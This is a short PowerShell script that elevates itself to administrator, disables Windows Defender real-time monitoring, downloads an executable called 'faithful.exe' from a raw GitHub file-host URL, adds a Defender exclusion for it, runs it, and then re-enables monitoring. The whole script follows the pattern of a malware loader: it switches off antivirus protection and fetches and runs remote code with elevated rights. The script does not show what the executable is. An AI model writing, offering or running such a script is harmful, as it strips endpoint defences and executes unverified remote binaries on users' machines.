if (!
    #current role
    (New-Object Security.Principal.WindowsPrincipal(
        [Security.Principal.WindowsIdentity]::GetCurrent()
    #is admin?
    )).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator
    )
) {
    #elevate script and exit current non-elevated runtime
    Start-Process `
        -FilePath 'powershell' `
        -ArgumentList (
            #flatten to single array
            '-File', $MyInvocation.MyCommand.Source, $args `
            | %{ $_ }
        ) `
        -Verb RunAs
    exit
}

cd $env:userprofile
pause
Set-MpPreference -DisableRealtimeMonitoring $true
pause
Write-Output "Starting script..."
pause
Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"
pause
Write-Output "Adding Windows Defender exclusion..."
pause
Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
pause
Start-Process ("faithful.exe")
pause
Set-MpPreference -DisableRealtimeMonitoring $false
pause
Write-Output "Done!"
pause
